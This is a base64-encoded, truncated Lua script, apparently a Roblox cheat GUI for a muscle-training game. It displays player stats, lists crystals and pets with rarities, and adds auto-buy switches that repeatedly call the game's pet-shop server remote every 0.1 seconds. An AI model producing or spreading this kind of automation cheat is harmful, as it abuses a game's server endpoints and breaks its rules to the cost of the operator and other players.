hZGVyc3RhdHMuU3RyZW5ndGguVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgbGVhZGVyc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBVcGRhdGUyLlRleHQgPSAiUmViaXJ0aDogIiAuLiBGb3JtYXREaXNwbGF5KGxlYWRlcnN0YXRzLlJlYmlydGhzLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGxlYWRlcnN0YXRzOkZpbmRGaXJzdENoaWxkKCJLaWxscyIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgVXBkYXRlNS5UZXh0ID0gIktpbGxzOiAiIC4uIEZvcm1hdERpc3BsYXkobGVhZGVyc3RhdHMuS2lsbHMuVmFsdWUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImN1cnJlbnRNYXAiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVXBkYXRlOS5UZXh0ID0gIkN1cnJlbnQgTWFwOiAiIC4uIHRvc3RyaW5nKHBsYXllci5jdXJyZW50TWFwLlZhbHVlKQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIFVwZGF0ZTkuVGV4dCA9ICJDdXJyZW50IE1hcDogQXVjdW5lIGRvbm7Dg8aSw4bigJnDg+KAoMOi4oKs4oSiw4PGksOi4oKsxaHDg+KAmsOCwqllIgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIHBldHMgPSB3aW5kb3c6QWRkVGFiKCAgICAgICAiUGV0IFNob3AiKQpsb2NhbCBSZXBsaWNhdGVkU3RvcmFnZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQoKLS0gQ3J5c3RhbCBkYXRhIHN0cnVjdHVyZSB3aXRoIGV4YWN0IG5hbWVzIGZyb20geW91ciBvcmlnaW5hbCBjb2RlCmxvY2FsIGNyeXN0YWxEYXRhID0gewogICAgWyJCbHVlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJCbHVlIEJpcmRpZSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIk9yYW5nZSBIZWRnZWhvZyIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkJsdWUgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlJlZCBLaXR0eSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgVmFtcHkiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEJ1bm55IiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlllbGxvdyBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0KICAgIH0sCiAgICBbIkdyZWVuIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJTaWx2ZXIgRG9nIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiR3JlZW4gQXVyYSIsIHJhcml0eSA9ICJBZHZhbmNlZCJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgR29sZW0iLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBCdXR0ZXJmbHkiLCByYXJpdHkgPSAiQWR2YW5jZWQifSwKICAgICAgICB7bmFtZSA9ICJDcmltc29uIEZhbGNvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiUmVkIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIEF1cmEiLCByYXJpdHkgPSAiQmFzaWMifSwKICAgICAgICB7bmFtZSA9ICJSZWQgQXVyYSIsIHJhcml0eSA9ICJCYXNpYyJ9LAogICAgICAgIHtuYW1lID0gIlllbGxvdyBBdXJhIiwgcmFyaXR5ID0gIkJhc2ljIn0KICAgIH0sCiAgICBbIkZyb3N0IENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJZZWxsb3cgQnV0dGVyZmx5IiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0sCiAgICAgICAge25hbWUgPSAiUHVycGxlIERyYWdvbiIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiQmx1ZSBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJPcmFuZ2UgUGVnYXN1cyIsIHJhcml0eSA9ICJSYXJlIn0sCiAgICAgICAge25hbWUgPSAiTGlnaHRuaW5nIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJFbGVjdHJvIiwgcmFyaXR5ID0gIkFkdmFuY2VkIn0KICAgIH0sCiAgICBbIk15dGhpY2FsIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJQdXJwbGUgRmFsY29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJSZWQgRHJhZ29uIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJCbHVlIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkdvbGRlbiBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJQb3dlciBMaWdodG5pbmciLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgTGlnaHRuaW5nIiwgcmFyaXR5ID0gIkVwaWMifQogICAgfSwKICAgIFsiSW5mZXJubyBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiUmVkIEZpcmVjYXN0ZXIiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkluZmVybmFsIERyYWdvbiIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQZWdhc3VzIiwgcmFyaXR5ID0gIlJhcmUifSwKICAgICAgICB7bmFtZSA9ICJHb2xkZW4gUGhlb25peCIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiSW5mZXJubyIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRGFyayBTdG9ybSIsIHJhcml0eSA9ICJVbmlxdWUifQogICAgfSwKICAgIFsiTGVnZW5kcyBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiVWx0cmEgQmlyZGllIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIk1hZ2ljIEJ1dHRlcmZseSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJHcmVlbiBGaXJlY2FzdGVyIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJXaGl0ZSBQaGVvbml4IiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJTdXBlcm5vdmEiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlB1cnBsZSBOb3ZhIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9LAogICAgWyJNdXNjbGUgRWxpdGUgQ3J5c3RhbCJdID0gewogICAgICAgIHtuYW1lID0gIkZyb3N0d2F2ZSBMZWdlbmRzIFBlbmd1aW4iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIlBoYW50b20gR2VuZXNpcyBEcmFnb24iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkRhcmsgTGVnZW5kcyBNYW50aWNvcmUiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlVsdGltYXRlIFN1cGVybm92YSBQZWdhc3VzIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJBZXRoZXIgU3Bpcml0IEJ1bm55IiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkN5YmVybmV0aWMgU2hvd2Rvd24gRHJhZ29uIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9CiAgICB9LAogICAgWyJHYWxheHkgT3JhY2xlIENyeXN0YWwiXSA9IHsKICAgICAgICB7bmFtZSA9ICJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4iLCByYXJpdHkgPSAiUmFyZSJ9LAogICAgICAgIHtuYW1lID0gIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiRGFya3N0YXIgSHVudGVyIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIk11c2NsZSBLaW5nIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkF6dXJlIFR1bmRyYSIsIHJhcml0eSA9ICJFcGljIn0sCiAgICAgICAge25hbWUgPSAiVWx0cmEgSW5mZXJubyIsIHJhcml0eSA9ICJSYXJlIn0KICAgIH0sCiAgICBbIkp1bmdsZSBDcnlzdGFsIl0gPSB7CiAgICAgICAge25hbWUgPSAiRW50cm9waWMgQmxhc3QiLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiTXVzY2xlIFNlbnNlaSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJHcmFuZCBTdXBlcm5vdmEiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIk5lb24gR3VhcmRpYW4iLCByYXJpdHkgPSAiVW5pcXVlIn0sCiAgICAgICAge25hbWUgPSAiRXRlcm5hbCBNZWdhc3RyaWtlIiwgcmFyaXR5ID0gIlVuaXF1ZSJ9LAogICAgICAgIHtuYW1lID0gIkdvbGRlbiBWaWtpbmciLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkFzdHJhbCBFbGVjdHJvIiwgcmFyaXR5ID0gIkVwaWMifSwKICAgICAgICB7bmFtZSA9ICJEYXJrIEVsZWN0cm8iLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIkVuY2hhbnRlZCBNaXJhZ2UiLCByYXJpdHkgPSAiRXBpYyJ9LAogICAgICAgIHtuYW1lID0gIlVsdHJhIE1pcmFnZSIsIHJhcml0eSA9ICJVbmlxdWUifSwKICAgICAgICB7bmFtZSA9ICJVbnN0YWJsZSBNaXJhZ2UiLCByYXJpdHkgPSAiVW5pcXVlIn0KICAgIH0KfQoKLS0gRnVuY3Rpb24gdG8gY29sbGVjdCBhbGwgdW5pcXVlIHBldHMgYW5kIGF1cmFzCmxvY2FsIGZ1bmN0aW9uIGdldEFsbFBldHNBbmRBdXJhcygpCiAgICBsb2NhbCBhbGxQZXRzID0ge30KICAgIGxvY2FsIGFsbEF1cmFzID0ge30KICAgIAogICAgZm9yIGNyeXN0YWxOYW1lLCBwZXRzIGluIHBhaXJzKGNyeXN0YWxEYXRhKSBkbwogICAgICAgIGZvciBfLCBwZXQgaW4gaXBhaXJzKHBldHMpIGRvCiAgICAgICAgICAgIGlmIHN0cmluZy5maW5kKHBldC5uYW1lLCAiQXVyYSIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIG5vdCBhbGxBdXJhc1twZXQubmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgIGFsbEF1cmFzW3BldC5uYW1lXSA9IHtuYW1lID0gcGV0Lm5hbWUsIHJhcml0eSA9IHBldC5yYXJpdHksIGNyeXN0YWwgPSBjcnlzdGFsTmFtZX0KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiBub3QgYWxsUGV0c1twZXQubmFtZV0gdGhlbgogICAgICAgICAgICAgICAgICAgIGFsbFBldHNbcGV0Lm5hbWVdID0ge25hbWUgPSBwZXQubmFtZSwgcmFyaXR5ID0gcGV0LnJhcml0eSwgY3J5c3RhbCA9IGNyeXN0YWxOYW1lfQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHJldHVybiBhbGxQZXRzLCBhbGxBdXJhcwplbmQKCi0tIEZ1bmN0aW9uIHRvIGZpbmQgd2hpY2ggY3J5c3RhbCBjb250YWlucyBhIHNwZWNpZmljIHBldC9hdXJhCmxvY2FsIGZ1bmN0aW9uIGZpbmRDcnlzdGFsRm9ySXRlbShpdGVtTmFtZSkKICAgIGZvciBjcnlzdGFsTmFtZSwgcGV0cyBpbiBwYWlycyhjcnlzdGFsRGF0YSkgZG8KICAgICAgICBmb3IgXywgcGV0IGluIGlwYWlycyhwZXRzKSBkbwogICAgICAgICAgICBpZiBwZXQubmFtZSA9PSBpdGVtTmFtZSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gY3J5c3RhbE5hbWUKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBuaWwKZW5kCgotLSBWYXJpYWJsZXMgdG8gdHJhY2sgY3VycmVudCBzZWxlY3Rpb25zCmxvY2FsIHNlbGVjdGVkUGV0ID0gIiIKbG9jYWwgc2VsZWN0ZWRBdXJhID0gIiIKCi0tIEdldCBhbGwgcGV0cyBhbmQgYXVyYXMKbG9jYWwgYWxsUGV0cywgYWxsQXVyYXMgPSBnZXRBbGxQZXRzQW5kQXVyYXMoKQoKcGV0czpBZGRMYWJlbCgiQXVyYSAmIFBldCBTaG9wIikKCi0tIFBldCBkcm9wZG93bgpsb2NhbCBwZXREcm9wZG93biA9IHBldHM6QWRkRHJvcGRvd24oIlNlbGVjdCBwZXQiLCBmdW5jdGlvbih0ZXh0KQogICAgc2VsZWN0ZWRQZXQgPSB0ZXh0CiAgICBsb2NhbCBjcnlzdGFsID0gZmluZENyeXN0YWxGb3JJdGVtKHRleHQpCiAgICBwcmludCgiUGV0IHNlbGVjdGVkOiAiIC4uIHRleHQgLi4gIiAoRm91bmQgaW46ICIgLi4gKGNyeXN0YWwgb3IgIlVua25vd24iKSAuLiAiKSIpCmVuZCkKCi0tIEFkZCBhbGwgcGV0cyBtYW51YWxseSAoc29ydGVkIGJ5IHJhcml0eSkKLS0gQmFzaWMgUGV0cwpwZXREcm9wZG93bjpBZGQoIkJsdWUgQmlyZGllIChCYXNpYykiKQpwZXREcm9wZG93bjpBZGQoIk9yYW5nZSBIZWRnZWhvZyAoQmFzaWMpIikKcGV0RHJvcGRvd246QWRkKCJSZWQgS2l0dHkgKEJhc2ljKSIpCnBldERyb3Bkb3duOkFkZCgiQmx1ZSBCdW5ueSAoQmFzaWMpIikKcGV0RHJvcGRvd246QWRkKCJTaWx2ZXIgRG9nIChCYXNpYykiKQoKLS0gQWR2YW5jZWQgUGV0cwpwZXREcm9wZG93bjpBZGQoIkRhcmsgVmFtcHkgKEFkdmFuY2VkKSIpCnBldERyb3Bkb3duOkFkZCgiRGFyayBHb2xlbSAoQWR2YW5jZWQpIikKcGV0RHJvcGRvd246QWRkKCJHcmVlbiBCdXR0ZXJmbHkgKEFkdmFuY2VkKSIpCnBldERyb3Bkb3duOkFkZCgiWWVsbG93IEJ1dHRlcmZseSAoQWR2YW5jZWQpIikKCi0tIFJhcmUgUGV0cwpwZXREcm9wZG93bjpBZGQoIkNyaW1zb24gRmFsY29uIChSYXJlKSIpCnBldERyb3Bkb3duOkFkZCgiUHVycGxlIERyYWdvbiAoUmFyZSkiKQpwZXREcm9wZG93bjpBZGQoIk9yYW5nZSBQZWdhc3VzIChSYXJlKSIpCnBldERyb3Bkb3duOkFkZCgiUHVycGxlIEZhbGNvbiAoUmFyZSkiKQpwZXREcm9wZG93bjpBZGQoIlJlZCBEcmFnb24gKFJhcmUpIikKcGV0RHJvcGRvd246QWRkKCJXaGl0ZSBQZWdhc3VzIChSYXJlKSIpCnBldERyb3Bkb3duOkFkZCgiRnJvc3R3YXZlIExlZ2VuZHMgUGVuZ3VpbiAoUmFyZSkiKQpwZXREcm9wZG93bjpBZGQoIlBoYW50b20gR2VuZXNpcyBEcmFnb24gKFJhcmUpIikKcGV0RHJvcGRvd246QWRkKCJFdGVybmFsIFN0cmlrZSBMZXZpYXRoYW4gKFJhcmUpIikKCi0tIEVwaWMgUGV0cwpwZXREcm9wZG93bjpBZGQoIkJsdWUgUGhlb25peCAoRXBpYykiKQpwZXREcm9wZG93bjpBZGQoIkJsdWUgRmlyZWNhc3RlciAoRXBpYykiKQpwZXREcm9wZG93bjpBZGQoIkdvbGRlbiBQaGVvbml4IChFcGljKSIpCnBldERyb3Bkb3duOkFkZCgiUmVkIEZpcmVjYXN0ZXIgKEVwaWMpIikKcGV0RHJvcGRvd246QWRkKCJHcmVlbiBGaXJlY2FzdGVyIChFcGljKSIpCnBldERyb3Bkb3duOkFkZCgiV2hpdGUgUGhlb25peCAoRXBpYykiKQpwZXREcm9wZG93bjpBZGQoIkRhcmsgTGVnZW5kcyBNYW50aWNvcmUgKEVwaWMpIikKcGV0RHJvcGRvd246QWRkKCJVbHRpbWF0ZSBTdXBlcm5vdmEgUGVnYXN1cyAoRXBpYykiKQpwZXREcm9wZG93bjpBZGQoIkxpZ2h0bmluZyBTdHJpa2UgUGhhbnRvbSAoRXBpYykiKQpwZXREcm9wZG93bjpBZGQoIkdvbGRlbiBWaWtpbmcgKEVwaWMpIikKCi0tIFVuaXF1ZSBQZXRzCnBldERyb3Bkb3duOkFkZCgiSW5mZXJuYWwgRHJhZ29uIChVbmlxdWUpIikKcGV0RHJvcGRvd246QWRkKCJVbHRyYSBCaXJkaWUgKFVuaXF1ZSkiKQpwZXREcm9wZG93bjpBZGQoIk1hZ2ljIEJ1dHRlcmZseSAoVW5pcXVlKSIpCnBldERyb3Bkb3duOkFkZCgiQWV0aGVyIFNwaXJpdCBCdW5ueSAoVW5pcXVlKSIpCnBldERyb3Bkb3duOkFkZCgiQ3liZXJuZXRpYyBTaG93ZG93biBEcmFnb24gKFVuaXF1ZSkiKQpwZXREcm9wZG93bjpBZGQoIkRhcmtzdGFyIEh1bnRlciAoVW5pcXVlKSIpCnBldERyb3Bkb3duOkFkZCgiTXVzY2xlIFNlbnNlaSAoVW5pcXVlKSIpCnBldERyb3Bkb3duOkFkZCgiTmVvbiBHdWFyZGlhbiAoVW5pcXVlKSIpCgotLSBBdXJhIGRyb3Bkb3duCmxvY2FsIGF1cmFEcm9wZG93biA9IHBldHM6QWRkRHJvcGRvd24oIlNlbGVjdCBBdXJhIiwgZnVuY3Rpb24odGV4dCkKICAgIHNlbGVjdGVkQXVyYSA9IHRleHQKICAgIGxvY2FsIGNyeXN0YWwgPSBmaW5kQ3J5c3RhbEZvckl0ZW0odGV4dCkKICAgIHByaW50KCJBdXJhIHNlbGVjdGVkOiAiIC4uIHRleHQgLi4gIiAoRm91bmQgaW46ICIgLi4gKGNyeXN0YWwgb3IgIlVua25vd24iKSAuLiAiKSIpCmVuZCkKCi0tIEFkZCBhbGwgYXVyYXMgbWFudWFsbHkgKHNvcnRlZCBieSByYXJpdHkpCi0tIEJhc2ljIEF1cmFzCmF1cmFEcm9wZG93bjpBZGQoIkJsdWUgQXVyYSAoQmFzaWMpIikKYXVyYURyb3Bkb3duOkFkZCgiR3JlZW4gQXVyYSAoQmFzaWMpIikKYXVyYURyb3Bkb3duOkFkZCgiUHVycGxlIEF1cmEgKEJhc2ljKSIpCmF1cmFEcm9wZG93bjpBZGQoIlJlZCBBdXJhIChCYXNpYykiKQphdXJhRHJvcGRvd246QWRkKCJZZWxsb3cgQXVyYSAoQmFzaWMpIikKYXVyYURyb3Bkb3duOkFkZCgiVWx0cmEgSW5mZXJubyAgKFJhcmUpIikKYXVyYURyb3Bkb3duOkFkZCgiQXp1cmUgVHVuZHJhIChFcGljKSIpCmF1cmFEcm9wZG93bjpBZGQoIkdyYW5kIFN1cGVybm92YSAoRXBpYykiKQphdXJhRHJvcGRvd246QWRkKCJNdXNjbGUgS2luZyAoVW5pcXVlKSIpCmF1cmFEcm9wZG93bjpBZGQoIkVudHJvcGljIEJsYXN0IChVbmlxdWUpIikKYXVyYURyb3Bkb3duOkFkZCgiRXRlcm5hbCBNZWdhc3RyaWtlIChVbmlxdWUpIikKCnBldHM6QWRkTGFiZWwoIkF1dG8gQnV5IikKCi0tIEF1dG8gYnV5IHBldCB0b2dnbGUKcGV0czpBZGRTd2l0Y2goIkF1dG8gQnV5IFBldCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBfRy5BdXRvQnV5UGV0ID0gYm9vbAogICAgCiAgICBpZiBib29sIHRoZW4KICAgICAgICBpZiBzZWxlY3RlZFBldCA9PSAiIiB0aGVuCiAgICAgICAgICAgIHByaW50KCJQbGVhc2Ugc2VsZWN0IGEgcGV0IGZpcnN0ISIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIEV4dHJhY3QgcGV0IG5hbWUgZnJvbSBkcm9wZG93biBzZWxlY3Rpb24gKHJlbW92ZSByYXJpdHkgcGFydCkKICAgICAgICBsb2NhbCBwZXROYW1lID0gc2VsZWN0ZWRQZXQ6bWF0Y2goIl4oLi0pJXMqJSgiKQogICAgICAgIGlmIG5vdCBwZXROYW1lIHRoZW4KICAgICAgICAgICAgcGV0TmFtZSA9IHNlbGVjdGVkUGV0CiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY3J5c3RhbCA9IGZpbmRDcnlzdGFsRm9ySXRlbShwZXROYW1lKQogICAgICAgIGlmIG5vdCBjcnlzdGFsIHRoZW4KICAgICAgICAgICAgcHJpbnQoIkNvdWxkIG5vdCBmaW5kIGNyeXN0YWwgZm9yIHBldDogIiAuLiBwZXROYW1lKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBwcmludCgiQXV0byBidXkgcGV0IHN0YXJ0ZWQgZm9yOiAiIC4uIHBldE5hbWUgLi4gIiBmcm9tICIgLi4gY3J5c3RhbCkKICAgICAgICBzcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgIHdoaWxlIF9HLkF1dG9CdXlQZXQgYW5kIHNlbGVjdGVkUGV0IH49ICIiIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwZXRUb0J1eSA9IFJlcGxpY2F0ZWRTdG9yYWdlLmNQZXRTaG9wRm9sZGVyOkZpbmRGaXJzdENoaWxkKHBldE5hbWUpCiAgICAgICAgICAgICAgICBpZiBwZXRUb0J1eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BSZW1vdGU6SW52b2tlU2VydmVyKHBldFRvQnV5KQogICAgICAgICAgICAgICAgICAgIHByaW50KCJCb3VnaHQgcGV0OiAiIC4uIHBldE5hbWUpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlBldCBub3QgZm91bmQ6ICIgLi4gcGV0TmFtZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIHByaW50KCJBdXRvIGJ1eSBwZXQgc3RvcHBlZCIpCiAgICBlbmQKZW5kKQoKLS0gQXV0byBidXkgYXVyYSB0b2dnbGUKcGV0czpBZGRTd2l0Y2goIkF1dG8gYnV5IEF1cmEiLCBmdW5jdGlvbihib29sKQogICAgX0cuQXV0b0J1eUF1cmEgPSBib29sCiAgICAKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIGlmIHNlbGVjdGVkQXVyYSA9PSAiIiB0aGVuCiAgICAgICAgICAgIHByaW50KCJQbGVhc2Ugc2VsZWN0IGFuIGF1cmEgZmlyc3QhIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgLS0gRXh0cmFjdCBhdXJhIG5hbWUgZnJvbSBkcm9wZG93biBzZWxlY3Rpb24gKHJlbW92ZSByYXJpdHkgcGFydCkKICAgICAgICBsb2NhbCBhdXJhTmFtZSA9IHNlbGVjdGVkQXVyYTptYXRjaCgiXiguLSklcyolKCIpCiAgICAgICAgaWYgbm90IGF1cmFOYW1lIHRoZW4KICAgICAgICAgICAgYXVyYU5hbWUgPSBzZWxlY3RlZEF1cmEKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBjcnlzdGFsID0gZmluZENyeXN0YWxGb3JJdGVtKGF1cmFOYW1lKQogICAgICAgIGlmIG5vdCBjcnlzdGFsIHRoZW4KICAgICAgICAgICAgcHJpbnQoIkNvdWxkIG5vdCBmaW5kIGNyeXN0YWwgZm9yIGF1cmE6ICIgLi4gYXVyYU5hbWUpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHByaW50KCJBdXRvIGJ1eSBhdXJhIHN0YXJ0ZWQgZm9yOiAiIC4uIGF1cmFOYW1lIC4uICIgZnJvbSAiIC4uIGNyeXN0YWwpCiAgICAgICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5BdXRvQnV5QXVyYSBhbmQgc2VsZWN0ZWRBdXJhIH49ICIiIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBhdXJhVG9CdXkgPSBSZXBsaWNhdGVkU3RvcmFnZS5jUGV0U2hvcEZvbGRlcjpGaW5kRmlyc3RDaGlsZChhdXJhTmFtZSkKICAgICAgICAgICAgICAgIGlmIGF1cmFUb0J1eSB0aGVuCiAgICAgICAgICAgICAgICAgICAgUmVwbGljYXRlZFN0b3JhZ2UuY1BldFNob3BSZW1vdGU6SW52b2tlU2VydmVyKGF1cmFUb0J1eSkKICAgICAgICAgICAgICAgICAgICBwcmludCgiQm91Z2h0IGF1cmE6ICIgLi4gYXVyYU5hbWUpCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkF1cmEgbm90IGZvdW5kOiAiIC4uIGF1cmFOYW1lKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgcHJpbnQoIkF1dG8gYnV5IGF1cmEgc3RvcHBlZCIpCiAgICBlbmQKZW5kKQoKLS0gU2hvdyB0aGUgcGV0cyB0YWIKcGV0czpTaG93KCkKCnBldHM6QWRkTGFiZWwoIlRNQiBBdXRvIEJ1eSBVbHRpbWF0ZXMiKQoKLS0gVWx0aW1hdGUgb3B0aW9ucwpsb2NhbCB1bHRpbWF0ZU9wdGlvbnMgPSB7CiAgICAiKzEgRGFpbHkgU3BpbiIsCiAgICAiKzEgUGV0IFNsb3QiLAogICAgIisxMCBJdGVtIENhcGFjaXR5IiwKICAgICIrNSUgUmVwIFNwZWVkIiwKICAgICJEZW1vbiBEYW1hZ2UiLAogICAgIkdhbGF4eSBHYWlucyIsCiAgICAiR29sZGVuIFJlYmlydGgiLAogICAgIkp1bmdsZSBTd2lmdCIsCiAgICAiTXVzY2xlIE1pbmQiLAogICAgIngyIENoZXN0IFJld2FyZHMiLAogICAgIngyIFF1ZXN0IFJld2FyZHMiCn0KCi0tIFZhcmlhYmxlIHRvIHRyYWNrIHNlbGVjdGVkIHVsdGltYXRlCmxvY2FsIHNlbGVjdGVkVWx0aW1hdGUgPSAiIgoKLS0gVWx0aW1hdGUgZHJvcGRvd24KbG9jYWwgdWx0aW1hdGVEcm9wZG93biA9IHBldHM6QWRkRHJvcGRvd24oIlNlbGVjdCB1bHRpbWF0ZSIsIGZ1bmN0aW9uKHRleHQpCiAgICBzZWxlY3RlZFVsdGltYXRlID0gdGV4dAogICAgcHJpbnQoIlVsdGltYXRlIHNlbGVjdGVkOiAiIC4uIHRleHQpCmVuZCkKCi0tIEFkZCBhbGwgdWx0aW1hdGUgb3B0aW9ucyB0byBkcm9wZG93bgpmb3IgXywgdWx0aW1hdGUgaW4gaXBhaXJzKHVsdGltYX